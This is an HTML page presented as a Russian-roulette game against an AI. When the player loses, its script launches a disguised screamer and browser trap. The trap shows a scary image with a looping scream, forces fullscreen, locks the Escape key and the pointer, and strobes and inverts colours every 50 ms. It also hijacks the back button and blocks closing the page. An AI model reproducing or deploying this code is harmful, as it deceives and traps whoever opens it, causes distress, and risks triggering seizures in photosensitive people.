<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Fatal Duel</title>
    <style>
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: black; overflow: hidden; font-family: 'Courier New', monospace; display: flex; justify-content: center; align-items: center; color: white; }
        #game-ui { text-align: center; z-index: 5; }
        #scary-screen { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: url('./scary.gif') center/cover; display: none; z-index: 1000; }
        
        /* Quick Death Text */
        #death-text {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            display: none; justify-content: center; align-items: center;
            background: black; z-index: 2000;
            color: #ff0000; font-size: 80px; font-weight: bold;
            text-shadow: 5px 5px #550000; letter-spacing: 10px;
        }

        button { padding: 20px 40px; font-size: 24px; cursor: pointer; background: #111; color: #cc0000; border: 2px solid #cc0000; text-transform: uppercase; font-weight: bold; margin-top: 20px; transition: 0.3s; }
        button:disabled { border-color: #444; color: #444; cursor: not-allowed; }
        #status { font-size: 22px; margin-bottom: 10px; color: #ff00ea; }
    </style>
</head>
<body>
    <!-- SVG Filter for Chromatic Aberration -->
    <svg style="position: absolute; width: 0; height: 0;">
      <filter id="chromatic">
        <feColorMatrix in="SourceGraphic" type="matrix" values="1 0 0 0 0  0 0 0 0 0  0 0 0 0 0  0 0 0 1 0" result="r"/>
        <feColorMatrix in="SourceGraphic" type="matrix" values="0 0 0 0 0  0 1 0 0 0  0 0 0 0 0  0 0 0 1 0" result="g"/>
        <feColorMatrix in="SourceGraphic" type="matrix" values="0 0 0 0 0  0 0 0 0 0  0 0 1 0 0  0 0 0 1 0" result="b"/>
        <feOffset id="red-off" in="r" dx="5" dy="0" result="r-shifted"/>
        <feOffset id="blue-off" in="b" dx="-5" dy="0" result="b-shifted"/>
        <feBlend in="r-shifted" in2="g" mode="screen" result="rg"/>
        <feBlend in="rg" in2="b-shifted" mode="screen"/>
      </filter>
    </svg>

    <div id="game-ui">
        <div id="status">PLAYER VS AI</div>
        <button id="trigger-btn">PULL TRIGGER</button>
    </div>

    <div id="death-text">YOU DIED</div>
    <div id="scary-screen"></div>
    <audio id="scream-audio" loop preload="auto"><source src="./scream.mp3"></audio>

    <script>
        const triggerBtn = document.getElementById('trigger-btn');
        const status = document.getElementById('status');
        const scaryScreen = document.getElementById('scary-screen');
        const deathText = document.getElementById('death-text');
        const scream = document.getElementById('scream-audio');
        const rOff = document.getElementById('red-off');
        const bOff = document.getElementById('blue-off');
        let isPlayerTurn = true;

        triggerBtn.addEventListener('click', () => {
            if (!isPlayerTurn) return;
            if (Math.floor(Math.random() * 6) + 1 === 1) {
                deathSequence();
            } else {
                status.innerText = "CLICK... SURVIVED.";
                isPlayerTurn = false;
                triggerBtn.disabled = true;
                setTimeout(aiTurn, 1000);
            }
        });

        function aiTurn() {
            status.innerText = "AI IS PULLING...";
            setTimeout(() => {
                if (Math.floor(Math.random() * 6) + 1 === 1) {
                    status.innerText = "AI DIED. RESETTING...";
                    setTimeout(() => location.reload(), 2000);
                } else {
                    status.innerText = "AI SURVIVED. YOUR TURN.";
                    isPlayerTurn = true;
                    triggerBtn.disabled = false;
                }
            }, 1000);
        }

        async function deathSequence() {
            // Show "YOU DIED" quickly
            document.getElementById('game-ui').style.display = 'none';
            deathText.style.display = 'flex';
            
            setTimeout(async () => {
                deathText.style.display = 'none';
                scaryScreen.style.display = 'block';
                scream.play().catch(() => {});

                const elem = document.documentElement;
                try {
                    if (elem.requestFullscreen) await elem.requestFullscreen();
                    if (navigator.keyboard && navigator.keyboard.lock) {
                        await navigator.keyboard.lock(["Escape", "KeyW"]);
                    }
                    if (elem.requestPointerLock) elem.requestPointerLock();
                } catch (err) {}

                startChaos();
            }, 800);
        }

        function startChaos() {
            // Strobe + Chromatic Aberration Pulse
            setInterval(() => {
                const intensity = Math.random() * 15;
                rOff.setAttribute('dx', intensity);
                bOff.setAttribute('dx', -intensity);

                scaryScreen.style.filter = Math.random() > 0.8 ? 
                    'url(#chromatic) invert(1) brightness(1.5)' : 'url(#chromatic)';
            }, 50);

            // Extreme Shake
            setInterval(() => {
                const x = (Math.random() - 0.5) * 60;
                const y = (Math.random() - 0.5) * 60;
                scaryScreen.style.transform = `translate(${x}px, ${y}px)`;
            }, 30);

            // Back Button Trap
            window.history.pushState(null, null, window.location.href);
            window.onpopstate = () => window.history.go(1);
            setInterval(() => window.history.pushState(null, "", window.location.href), 100);

            window.onbeforeunload = (e) => { e.preventDefault(); e.returnValue = ''; };

            document.addEventListener('fullscreenchange', () => {
                if (!document.fullscreenElement) scaryScreen.onclick = () => deathSequence();
            });
        }
    </script>
</body>
</html>
